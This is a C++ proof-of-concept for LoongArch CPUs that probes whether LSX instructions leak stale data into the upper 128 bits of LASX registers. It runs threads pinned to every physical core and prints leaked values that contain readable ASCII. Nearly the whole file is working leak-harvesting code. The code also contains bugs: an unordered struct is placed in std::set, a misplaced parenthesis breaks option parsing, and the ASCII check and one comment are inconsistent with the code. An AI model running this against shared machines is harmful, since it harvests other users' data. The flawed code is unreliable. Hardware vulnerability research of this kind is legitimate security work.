// PoC: detect data leaks into upper 128 bits of LASX $xr registers
// when executing LSX (128-bit SIMD) instructions.
//
// LoongArch: $vr registers (128-bit, LSX) alias the lower half of $xr (256-bit,
// LASX). LSX instructions should only write the lower 128 bits ($vr). The upper
// 128 bits should remain untouched. If they change, it indicates a
// microarchitectural leak.
//
// Usage:
//   g++ -std=c++11 -O2 -march=native -pthread -o loongbleed_poc
//   loongbleed_poc.cpp
//   ./loongbleed_poc

#include <array>
#include <assert.h>
#include <pthread.h>
#include <sched.h>
#include <set>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Each 64-byte chunk:
//   [ 0..31] = input pattern for $xr (256 bits)
//   [32..63] = $xr after LSX instruction (written by gadget)
#define CHUNK_SIZE 64
#define REPEAT 16
#define BUF_SIZE (CHUNK_SIZE * REPEAT)

// ---- Global state (protected by mutex) ----
static volatile int running = 1;
static int num_online_cpus;
static int
    *thread_cpus; // list of logical CPUs to pin to (one per physical core)

static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

// ---- Signal handler for clean shutdown ------------------------------------
static void sigint_handler(int) { running = 0; }

// ---- Gadget ----------------------------------------------------------------
// Macro: test LSX instruction on register $vrN / $xrN.
#define LSX_LEAK_TEST_VOR(N)                                                   \
  __asm__ volatile("xvld  $xr" #N ", %[p], 0\n\t"                              \
                   "vor.v $vr" #N ", $vr" #N ", $vr" #N "\n\t"                 \
                   "xvst  $xr" #N ", %[p], 32\n\t"                             \
                   :                                                           \
                   : [p] "r"(p)                                                \
                   : "$xr" #N, "memory")
#define LSX_LEAK_TEST_VLD(N)                                                   \
  __asm__ volatile("xvld  $xr" #N ", %[p], 0\n\t"                              \
                   "vld   $vr" #N ", %[p], 0\n\t"                              \
                   "xvst  $xr" #N ", %[p], 32\n\t"                             \
                   :                                                           \
                   : [p] "r"(p)                                                \
                   : "$xr" #N, "memory")
#define LSX_LEAK_TEST_FLD_D(N)                                                 \
  __asm__ volatile("xvld  $xr" #N ", %[p], 0\n\t"                              \
                   "fld.d   $f" #N ", %[p], 0\n\t"                             \
                   "xvst  $xr" #N ", %[p], 32\n\t"                             \
                   :                                                           \
                   : [p] "r"(p)                                                \
                   : "$xr" #N, "memory")
#define LSX_LEAK_TEST_FLD_S(N)                                                 \
  __asm__ volatile("xvld  $xr" #N ", %[p], 0\n\t"                              \
                   "fld.s $f" #N ", %[p], 0\n\t"                               \
                   "xvst  $xr" #N ", %[p], 32\n\t"                             \
                   :                                                           \
                   : [p] "r"(p)                                                \
                   : "$xr" #N, "memory")

typedef void (*gadget)(char *buf);

// Inline assembly: load 256-bit pattern into $xr%j, run an LSX instruction
// (vor.v) on $vr%j, then store the full 256-bit result.  Each iteration uses a
// different register pair ($vr0 … $vr15 / $xr0 … $xr15) to probe for leaks
// across the register file.
//
// Arguments:
//   a0 (x0 = buf)  -- pointer to first chunk
//
// The "memory" clobber ensures the compiler reloads/stores around the asm.
#define CREATE_GADGET(name, macro)                                             \
  static void __attribute__((noinline)) name(char *buf) {                      \
    char *p = buf;                                                             \
    macro(0);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(1);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(2);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(3);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(4);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(5);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(6);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(7);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(8);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(9);                                                                  \
    p += CHUNK_SIZE;                                                           \
    macro(10);                                                                 \
    p += CHUNK_SIZE;                                                           \
    macro(11);                                                                 \
    p += CHUNK_SIZE;                                                           \
    macro(12);                                                                 \
    p += CHUNK_SIZE;                                                           \
    macro(13);                                                                 \
    p += CHUNK_SIZE;                                                           \
    macro(14);                                                                 \
    p += CHUNK_SIZE;                                                           \
    macro(15);                                                                 \
    p += CHUNK_SIZE;                                                           \
  }

// Variants
CREATE_GADGET(test_gadget_vor, LSX_LEAK_TEST_VOR)
CREATE_GADGET(test_gadget_vld, LSX_LEAK_TEST_VLD)
CREATE_GADGET(test_gadget_fld_d, LSX_LEAK_TEST_FLD_D)
CREATE_GADGET(test_gadget_fld_s, LSX_LEAK_TEST_FLD_S)

static gadget test_gadget = test_gadget_vor;

// ---- Per-thread worker -----------------------------------------------------
static void *worker(void *arg) {
  int cpu = *(int *)arg;

  // Pin to the specified logical CPU
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(cpu, &cpuset);
  if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
    perror("sched_setaffinity");
    return NULL;
  }

  // Aligned buffer for LASX loads/stores (32-byte alignment required)
  char buf[BUF_SIZE] __attribute__((aligned(32)));

  // Initialise input pattern: all zeros.  Any non-zero upper bits = leak.
  memset(buf, 0, BUF_SIZE);

  printf("[cpu %2d] thread started, pinning to CPU %d\n", cpu, cpu);

  struct data {
    uint64_t data0;
    uint64_t data1;
    uint64_t data2;
    uint64_t data3;
  };

  std::set<struct data> seen;

  while (running) {
    // Clear the area
    memset(buf, 0, BUF_SIZE);

    // Run the gadget
    test_gadget(buf);

    for (int j = 0; j < REPEAT; j++) {
      uint64_t *chunk = (uint64_t *)(buf + CHUNK_SIZE * j);

      // Check for leaked data in the lower 128 bits
      uint64_t data0 = chunk[4];
      uint64_t data1 = chunk[5];
      uint64_t data2 = chunk[6];
      uint64_t data3 = chunk[7];
      if (data0 != 0 || data1 != 0 || data2 != 0 || data3 != 0) {
        struct data key = {data0, data1, data2, data3};
        if (seen.find(key) == seen.end()) {
          seen.insert(key);

          // Only print if enough continuous bytes are valid ASCII
          uint8_t *p = (uint8_t *)&chunk[4] + 4;
          int ascii_count = 0;
          int cont_count = 0;
          for (int i = 0; i < 28; i++) {
            if (p[i] >= 0x20 && p[i] <= 0x7e) {
              if (i > 0) {
                if (p[i - 1] >= 0x20 && p[i - 1] <= 0x7e) {
                  cont_count += 1;
                } else {
                  cont_count = 1;
                }
              } else {
                cont_count = 1;
              }
            } else {
              cont_count = 0;
            }
            if (cont_count > ascii_count) {
              ascii_count = cont_count;
            }
          }

          if (cont_count >= 8) {
            pthread_mutex_lock(&lock);
            printf("[cpu %3d] LEAK chunk=%2d "
                   "data=0x%016lx_%016lx_%016lx_%016lx ascii=",
                   cpu, j, data3, data2, data1, data0);
            for (int i = 0; i < 28; i++) {
              if (p[i] >= 0x20 && p[i] <= 0x7e)
                putchar(p[i]);
              else
                putchar('.');
            }
            putchar('\n');
            pthread_mutex_unlock(&lock);
          }
        }
      }
    }
  }
  return NULL;
}

// ---- CPU topology discovery ------------------------------------------------
// On LoongArch with SMT-2: even-numbered logical CPUs are the first SMT thread
// of each physical core.  We pick one per physical core (the even ones).
static int discover_cpus(void) {
  long n = sysconf(_SC_NPROCESSORS_CONF);
  if (n <= 0) {
    fprintf(stderr, "Cannot determine number of CPUs\n");
    return -1;
  }
  thread_cpus = (int *)malloc(sizeof(int) * (n / 2 + 1));
  if (!thread_cpus)
    return -1;

  int count = 0;
  for (int cpu = 0; cpu < n; cpu += 2)
    thread_cpus[count++] = cpu;

  num_online_cpus = count;
  return count;
}

// ---- Main ------------------------------------------------------------------
static void usage(const char *prog) {
  fprintf(stderr,
          "Usage: %s [OPTIONS]\n"
          "Detect data leaks into upper 128 bits of LASX $xr registers when\n"
          "executing LSX instructions.\n\n"
          "Options:\n"
          "  -a, --all Launch one thread pinned to each physical core.\n"
          "                      By default only thread on CPU 0 is launched.\n"
          "  -g, --gadget [vor|vld|fld.d|fld.s] Use differents instructions "
          "for testing.\n"
          "  -h, --help Show this help and exit.\n",
          prog);
}

int main(int argc, char **argv) {
  int all_cores = 0;

  // Parse command-line arguments
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "-a") == 0 || strcmp(argv[i], "--all") == 0) {
      all_cores = 1;
    } else if ((strcmp(argv[i], "-g") == 0 || strcmp(argv[i], "--gadget")) ==
                   0 &&
               (i + 1) < argc) {
      if (strcmp(argv[i + 1], "vor") == 0) {
        test_gadget = test_gadget_vor;
      } else if (strcmp(argv[i + 1], "vld") == 0) {
        test_gadget = test_gadget_vld;
      } else if (strcmp(argv[i + 1], "fld.d") == 0) {
        test_gadget = test_gadget_fld_d;
      } else if (strcmp(argv[i + 1], "fld.s") == 0) {
        test_gadget = test_gadget_fld_s;
      } else {
        usage(argv[0]);
        return 1;
      }
      printf("Using gadget %s\n", argv[i + 1]);
      i++;
    } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
      usage(argv[0]);
      return 0;
    } else {
      fprintf(stderr, "Unknown option: %s\n", argv[i]);
      usage(argv[0]);
      return 1;
    }
  }

  printf("=== LSX upper-128-bit leak detector (multithreaded) ===\n");
  printf("Detecting data leaks into upper 128 bits of $xr registers\n");
  printf("when executing LSX instructions.\n\n");

  int n_threads;
  int single_cpu_buf = 0;

  if (all_cores) {
    n_threads = discover_cpus();
    if (n_threads <= 0) {
      fprintf(stderr, "Failed to discover CPU topology\n");
      return 1;
    }
    printf("Discovered %d physical cores, launching one thread per core\n",
           n_threads);
  } else {
    // Default: single thread pinned to CPU 0
    n_threads = 1;
    thread_cpus = &single_cpu_buf;
    thread_cpus[0] = 0;
    printf("Single-thread mode, pinning to CPU 0\n");
    printf("  (use --all to launch one thread per physical core)\n");
  }

  printf("Thread-to-CPU mapping:\n");
  for (int i = 0; i < n_threads; i++)
    printf("  thread[%2d] -> CPU %d\n", i, thread_cpus[i]);
  printf("\n");

  // Launch threads
  pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * n_threads);
  assert(threads);

  for (int i = 0; i < n_threads; i++) {
    if (pthread_create(&threads[i], NULL, worker, &thread_cpus[i]) != 0) {
      perror("pthread_create");
      running = 0;
      n_threads = i;
      break;
    }
  }

  printf("Running... press Ctrl+C to stop\n");
  fflush(stdout);

  signal(SIGINT, sigint_handler);

  while (running)
    pause();

  // Join threads
  for (int i = 0; i < n_threads; i++)
    pthread_join(threads[i], NULL);

  free(threads);
  if (all_cores)
    free(thread_cpus);
  printf("\n=== Done ===\n");
  return 0;
}
